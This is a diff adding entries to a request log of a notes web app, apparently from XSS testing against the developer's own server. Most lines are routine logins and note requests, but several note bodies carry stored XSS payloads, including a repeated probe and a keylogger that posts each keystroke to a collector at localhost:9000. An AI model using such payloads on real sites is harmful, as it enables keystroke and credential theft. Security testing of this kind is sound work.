@@ -817,3 +817,172 @@
 2025-07-05T15:15:27.036Z GET /notes?_page=1&_per_page=10 {}
 2025-07-05T15:15:46.713Z POST /notes {"title":"new note","content":"<img src=x\n     onerror=\"\n       if (!window.__xssKeylogInit) {\n         window.__xssKeylogInit = true;                 /* guard */\n         document.addEventListener('keydown', e => {\n           fetch('http://localhost:9000', {\n             method: 'POST',\n             headers: { 'Content-Type': 'text/plain' }, /* simple request */\n             body: e.key\n           });\n         });\n       }\n     \">"}
 2025-07-05T15:15:47.010Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:10:58.952Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:11:00.413Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:11:12.266Z POST /users {"name":"omer","email":"omer","username":"omer","password":"omer"}
+2025-07-05T19:11:18.509Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:11:19.693Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:11:25.469Z POST /notes {"title":"new note","content":"fdsfsdf"}
+2025-07-05T19:11:26.648Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:11:43.782Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:11:52.016Z PUT /notes/686978dd04d5cadbbf9392b4 {"content":"11111"}
+2025-07-05T19:11:52.973Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:13:15.896Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:13:16.067Z POST /users {"name":"Tester","email":"u_epj7t9@example.com","username":"u_epj7t9","password":"pass1234"}
+2025-07-05T19:13:16.128Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:13:17.932Z POST /login {"username":"u_epj7t9","password":"pass1234"}
+2025-07-05T19:13:18.183Z POST /notes {"title":"new note","content":"<b>hello world</b>"}
+2025-07-05T19:13:18.340Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:14:22.580Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:14:22.715Z POST /users {"name":"Tester","email":"u_wuazag@example.com","username":"u_wuazag","password":"pass1234"}
+2025-07-05T19:14:22.819Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:14:22.962Z POST /login {"username":"u_wuazag","password":"pass1234"}
+2025-07-05T19:14:23.362Z POST /notes {"title":"new note","content":"<b>hello world</b>"}
+2025-07-05T19:14:23.688Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:03.456Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:03.567Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:03.593Z POST /users {"name":"Tester","email":"u_j4ytms@example.com","username":"u_j4ytms","password":"pass1234"}
+2025-07-05T19:15:03.943Z POST /login {"username":"u_j4ytms","password":"pass1234"}
+2025-07-05T19:15:04.193Z POST /notes {"title":"new note","content":"<b>hello world</b>"}
+2025-07-05T19:15:13.124Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:13.260Z POST /users {"name":"Tester","email":"u_fsjdqv@example.com","username":"u_fsjdqv","password":"pass1234"}
+2025-07-05T19:15:15.090Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:15.627Z POST /login {"username":"u_fsjdqv","password":"pass1234"}
+2025-07-05T19:15:16.676Z POST /notes {"title":"new note","content":"<b>hello world</b>"}
+2025-07-05T19:15:51.092Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:51.165Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:15:51.259Z POST /users {"name":"Tester","email":"u_uv1tvb@example.com","username":"u_uv1tvb","password":"pass1234"}
+2025-07-05T19:15:51.490Z POST /login {"username":"u_uv1tvb","password":"pass1234"}
+2025-07-05T19:15:51.707Z POST /notes {"title":"new note","content":"<b>hello world</b>"}
+2025-07-05T19:15:51.860Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:16:19.879Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:16:19.985Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:19.601Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:19.683Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:19.788Z POST /users {"name":"Tester","email":"u_d4oz1k@example.com","username":"u_d4oz1k","password":"pass1234"}
+2025-07-05T19:17:21.155Z POST /login {"username":"u_d4oz1k","password":"pass1234"}
+2025-07-05T19:17:21.386Z POST /notes {"title":"new note","content":"<b>hello nsv3ag</b>"}
+2025-07-05T19:17:21.541Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:21.803Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:17:21.987Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:28.851Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:17:29.154Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:18:09.703Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:18:11.656Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:18:11.660Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:19:40.881Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:19:41.149Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:08.588Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:08.666Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:08.744Z POST /users {"name":"Tester","email":"u_w5qyc8@example.com","username":"u_w5qyc8","password":"pass1234"}
+2025-07-05T19:23:09.103Z POST /login {"username":"u_w5qyc8","password":"pass1234"}
+2025-07-05T19:23:09.335Z POST /notes {"title":"new note","content":"<b>hello 3kjun3</b>"}
+2025-07-05T19:23:09.519Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:12.286Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:23:12.440Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:19.494Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:20.457Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:22.641Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:36.733Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:36.809Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:36.867Z POST /users {"name":"Tester","email":"u_tdbrx7@example.com","username":"u_tdbrx7","password":"pass1234"}
+2025-07-05T19:23:37.101Z POST /login {"username":"u_tdbrx7","password":"pass1234"}
+2025-07-05T19:23:37.349Z POST /notes {"title":"new note","content":"<b>hello 4hs952</b>"}
+2025-07-05T19:23:37.506Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:23:37.767Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:23:37.924Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:32.938Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:33.017Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:33.057Z POST /users {"name":"Tester","email":"u_msd0dn@example.com","username":"u_msd0dn","password":"pass1234"}
+2025-07-05T19:24:33.289Z POST /login {"username":"u_msd0dn","password":"pass1234"}
+2025-07-05T19:24:33.505Z POST /notes {"title":"new note","content":"<b>hello qa8p0h</b>"}
+2025-07-05T19:24:33.664Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:33.943Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:24:34.096Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:47.427Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:47.503Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:47.562Z POST /users {"name":"Tester","email":"u_52nezw@example.com","username":"u_52nezw","password":"pass1234"}
+2025-07-05T19:24:47.812Z POST /login {"username":"u_52nezw","password":"pass1234"}
+2025-07-05T19:24:48.028Z POST /notes {"title":"new note","content":"<b>hello hacggv</b>"}
+2025-07-05T19:24:48.178Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:24:48.462Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:24:48.633Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:00.109Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:00.231Z POST /users {"name":"Tester","email":"u_u0iknd@example.com","username":"u_u0iknd","password":"pass1234"}
+2025-07-05T19:25:00.323Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:00.463Z POST /login {"username":"u_u0iknd","password":"pass1234"}
+2025-07-05T19:25:00.713Z POST /notes {"title":"new note","content":"<b>hello lwlm7y</b>"}
+2025-07-05T19:25:00.906Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:01.129Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:25:01.354Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:10.615Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:10.748Z POST /users {"name":"Tester","email":"u_hbvzhn@example.com","username":"u_hbvzhn","password":"pass1234"}
+2025-07-05T19:25:11.492Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:12.079Z POST /login {"username":"u_hbvzhn","password":"pass1234"}
+2025-07-05T19:25:12.296Z POST /notes {"title":"new note","content":"<b>hello 2yb9er</b>"}
+2025-07-05T19:25:12.447Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:25:12.562Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:26:48.655Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:26:48.794Z POST /users {"name":"Tester","email":"u_dwb9ff@example.com","username":"u_dwb9ff","password":"pass1234"}
+2025-07-05T19:26:49.661Z POST /login {"username":"u_dwb9ff","password":"pass1234"}
+2025-07-05T19:26:49.822Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:26:49.925Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:26:50.023Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:26:50.093Z POST /notes {"title":"new note","content":"<b>hello ixbawn</b>"}
+2025-07-05T19:26:50.232Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:26:50.315Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:26:51.946Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:26:52.460Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:26:52.831Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:00.822Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:00.960Z POST /users {"name":"Tester","email":"u_amj33s@example.com","username":"u_amj33s","password":"pass1234"}
+2025-07-05T19:27:00.981Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:01.205Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:01.309Z POST /login {"username":"u_amj33s","password":"pass1234"}
+2025-07-05T19:27:01.338Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:01.559Z POST /notes {"title":"new note","content":"<b>hello aggdeq</b>"}
+2025-07-05T19:27:01.850Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:02.409Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:27:02.717Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:10.433Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:10.518Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:10.575Z POST /users {"name":"Tester","email":"u_v8dtyp@example.com","username":"u_v8dtyp","password":"pass1234"}
+2025-07-05T19:27:10.731Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:10.809Z POST /login {"username":"u_v8dtyp","password":"pass1234"}
+2025-07-05T19:27:10.824Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:11.042Z POST /notes {"title":"new note","content":"<b>hello j7j3pt</b>"}
+2025-07-05T19:27:11.216Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:11.391Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:27:11.558Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:37.023Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:37.141Z POST /users {"name":"Tester","email":"u_4f9w19@example.com","username":"u_4f9w19","password":"pass1234"}
+2025-07-05T19:27:37.288Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:37.372Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:37.457Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:27:37.508Z POST /login {"username":"u_4f9w19","password":"pass1234"}
+2025-07-05T19:27:37.758Z POST /notes {"title":"new note","content":"<b>hello ut2la3</b>"}
+2025-07-05T19:27:37.938Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:27:38.123Z POST /notes {"title":"new note","content":"<img src=x onerror=\"document.body.setAttribute('xss','1')\">"}
+2025-07-05T19:27:38.649Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:29:22.432Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:29:22.513Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:29:22.520Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:29:30.653Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:29:33.865Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:30:39.972Z POST /users {"name":"omer","email":"omer","username":"omer","password":"omer"}
+2025-07-05T19:31:05.160Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:31:13.452Z POST /notes {"title":"new note","content":"<img src=x\n     onerror=\"\n       if (!window.__xssKeylogInit) {\n         window.__xssKeylogInit = true;                 /* guard */\n         document.addEventListener('keydown', e => {\n           fetch('http://localhost:9000', {\n             method: 'POST',\n             headers: { 'Content-Type': 'text/plain' }, /* simple request */\n             body: e.key\n           });\n         });\n       }\n     \">"}
+2025-07-05T19:31:14.567Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:31:22.032Z POST /notes {"title":"new note","content":"aaaa"}
+2025-07-05T19:31:22.211Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:31:22.316Z GET /notes?_page=3&_per_page=10 {}
+2025-07-05T19:32:06.753Z DELETE /notes/68697d8a4480e0087f1e440b {}
+2025-07-05T19:32:07.074Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:32:07.878Z DELETE /notes/68697d824480e0087f1e4406 {}
+2025-07-05T19:32:08.192Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:32:10.318Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:32:10.398Z GET /notes?_page=1&_per_page=10 {}
+2025-07-05T19:32:10.405Z GET /notes?_page=2&_per_page=10 {}
+2025-07-05T19:32:31.187Z POST /login {"username":"omer","password":"omer"}
+2025-07-05T19:32:36.434Z POST /notes {"title":"new note","content":"<img src=x\n     onerror=\"\n       if (!window.__xssKeylogInit) {\n         window.__xssKeylogInit = true;                 /* guard */\n         document.addEventListener('keydown', e => {\n           fetch('http://localhost:9000', {\n             method: 'POST',\n             headers: { 'Content-Type': 'text/plain' }, /* simple request */\n             body: e.key\n           });\n         });\n       }\n     \">"}
+2025-07-05T19:32:39.468Z GET /notes?_page=1&_per_page=10 {}
